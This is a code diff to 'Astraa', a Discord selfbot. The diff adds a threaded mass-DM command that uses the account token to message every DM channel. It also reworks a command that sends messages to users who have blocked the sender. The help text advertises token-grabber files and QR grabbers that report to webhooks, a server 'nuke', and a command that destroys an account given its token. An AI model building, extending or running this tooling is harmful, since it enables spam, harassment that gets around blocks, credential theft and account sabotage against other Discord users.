@@ -24,6 +24,7 @@ SOFTWARE."""
 import asyncio
 import datetime
 import functools
+import threading
 import io
 import json
 import os
@@ -216,7 +217,7 @@ Astraa.sniped_message_dict = {}
 Astraa.sniped_edited_message_dict = {}
 Astraa.whitelisted_users = {}
 Astraa.copycat = None
-Astraa.blockbypass = None
+Astraa.create = False
 Astraa.remove_command('help')
 
 
@@ -271,14 +272,6 @@ async def on_message_edit(before, after):
 async def on_message(message):
     if Astraa.copycat is not None and Astraa.copycat.id == message.author.id:
         await message.channel.send(chr(173) + message.content)
-    
-    if Astraa.blockbypass is not None and message.author.id == Astraa.user.id:
-        token = config.get('token')
-        headers = {'Authorization': token}
-        r = requests.post(f'https://discordapp.com/api/v6/channels/{Astraa.blockbypass}/messages', headers=headers, json={'content': message.content})
-        Astraa.blockbypass = None
-        await message.edit(content=f"Message sent with success!")
-        return delete_password
 
     def GiveawayData():
         print(f"{y}[{b}+{y}]{w} SERVER: {message.guild}\n{y}[{b}+{y}]{w} CHANNEL: {message.channel}")
@@ -742,6 +735,8 @@ async def help(ctx, category=None):
         embed = f"""**GENERAL COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
 > :handshake: `{Astraa.command_prefix}help <category>`\n*Returns all commands of that category*
 > :wrench: `{Astraa.command_prefix}prefix <prefix>`\n*Changes the bot's prefix*
+> :wrench: `{Astraa.command_prefix}custom`\n*Create your own command*
+> :recycle: `{Astraa.command_prefix}resetcustom`\n*Reset your own command*
 > :slot_machine: `{Astraa.command_prefix}slotbot <true/false>`\n*Enable or disable the slotbot option*
 > :tada: `{Astraa.command_prefix}giveaway <true/false>`\n*Enable or disable the giveway option*
 > :gun: `{Astraa.command_prefix}msgsniper <true/false>`\n*Enable or disable the msgsniper option*
@@ -794,13 +789,14 @@ async def help(ctx, category=None):
         embed = f"""**ATIO COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
 > :boom: `{Astraa.command_prefix}destroy`\n*Nuke a discord server*
 > :magnet: `{Astraa.command_prefix}filegrabber <webhook>`\n*Send a Token Grabber File*
-> :camera_with_flash: `{Astraa.command_prefix}qrgrabber`\n*Send a QR Grabber Image*
+> :camera_with_flash: `{Astraa.command_prefix}qrgrabber <webhook>`\n*Send a QR Grabber Image*
 > :boom: `{Astraa.command_prefix}tokenfuck <token>`\n*Destroy a Account with his token*
 > :page_facing_up: `{Astraa.command_prefix}tokeninfo <token>`\n*Scrape info with a token*
 > :recycle: `{Astraa.command_prefix}autolog <token>`\n*Log in to the account automatically*
 > :broom: `{Astraa.command_prefix}cleardm <amount>`\n*Delete all dm with a user*
 > :house: `{Astraa.command_prefix}hypesquad <house>`\n*Change your hypesquad badge*
 > :page_facing_up: `{Astraa.command_prefix}serverinfo`\n*Get all infos about a discord server*
+> :mega: `{Astraa.command_prefix}massdm <message>`\n*Mass Dm all your friends*
 > :crystal_ball: `{Astraa.command_prefix}nitro`\n*Generates a random nitro code*
 > :wastebasket: `{Astraa.command_prefix}webhookremove <webhook>`\n*Delete the selected webhook*"""
         await ctx.send(embed, file=discord.File("Images/astraa.gif"))
@@ -906,6 +902,31 @@ async def prefix(ctx, prefix):
         await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}prefix <prefix>')
         return
     Astraa.command_prefix = str(prefix)
+
+#Create your own command
+@Astraa.command(aliases=["createcommand", "new", "newcommand"])
+async def custom(ctx):
+    if Astraa.create == False:
+        try:
+            await ctx.message.edit(content=f"Command Text:", delete_after=10)
+            global msgcustom
+            msgcustom = await ctx.bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=60)
+            await ctx.message.delete()
+            await ctx.send(f'Command: {Astraa.command_prefix}custom')
+            Astraa.create = True
+        except Exception as e:
+            await ctx.send(f'[ERROR]: {e}')
+    elif Astraa.create == True:
+        await ctx.message.edit(content=msgcustom.content)
+
+#Reset your own command
+@Astraa.command(aliases=["resetcommand"])
+async def resetcustom(ctx):
+    if Astraa.create == False:
+        await ctx.send(f'[ERROR]: Command already reset!')
+    elif Astraa.create == True:
+        Astraa.create = False
+        await ctx.send(f'Command reset!')
 
 #Shows how long you have been using the SelfBot
 @Astraa.command()
@@ -1875,6 +1896,44 @@ async def serverinfo(ctx):
 > :page_facing_up: __Others Information__\n\t`{len(ctx.guild.members)}` Members\n\t`{len(ctx.guild.roles)}` Roles\n\t`{len(ctx.guild.text_channels) if ctx.guild.text_channels else "None"}` Text-Channels\n\t`{len(ctx.guild.voice_channels) if ctx.guild.voice_channels else "None"}` Voice-Channels\n\t`{len(ctx.guild.categories) if ctx.guild.categories else "None"}` Categories"""
     await ctx.send(embed, file=discord.File("Images/astraa.gif"))
 
+#Mass Dm all your friends
+@Astraa.command(aliases=["frienddm", "dmfriend"])
+async def massdm(ctx, message=None):
+    await ctx.message.delete()
+    if message is None:
+        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}massdm <message>')
+        return
+    token = config.get('token')
+
+    def getheaders(token=None):
+        headers = {
+                "Content-Type": "application/json",
+                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
+        }
+        if token:
+            headers.update({"Authorization": token})
+        return headers
+    
+    def MassDM(channels, Message):
+        for channel in channels:
+            for user in [x["username"]+"#"+x["discriminator"] for x in channel["recipients"]]:
+                try:
+                    requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', headers={'Authorization': token}, data={"content": f"{Message}"})
+                    print(f"\nMessage sent to " + user)
+                except:
+                    pass
+    processes = []
+    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
+    if not channelIds:
+        print(f"[ERROR]: You are alone, you have no dm...")
+        return
+    for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
+        t = threading.Thread(target=MassDM, args=(channel, message))
+        t.start()
+        processes.append(t)
+    for process in processes:
+        process.join()
+
 #Generate a random nitro code
 @Astraa.command(aliases=["nitrogen"])
 async def nitro(ctx):
@@ -1917,14 +1976,18 @@ async def edit(ctx, message=None):
 @Astraa.command(aliases=["blockbp", "bpblock", "bpb"])
 async def bypassblock(ctx, userid=None):
     if userid is None:
-            await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}bypassblock <userid> <message>')
+            await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}bypassblock <userid>')
             return
     try:
+        token = config.get('token')
         headers = {'Authorization': token}
         res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json={'recipient_id': userid})
         channel_id = res.json().get('id')
         await ctx.message.edit(content=f"Message to send:", delete_after=10)
-        Astraa.blockbypass = channel_id
+        msgbypass = await ctx.bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=60)
+        requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': msgbypass.content})
+        await ctx.send("Message sent with success!")
+
     except Exception as e:
         await ctx.send(f'[ERROR]: {e}')
 
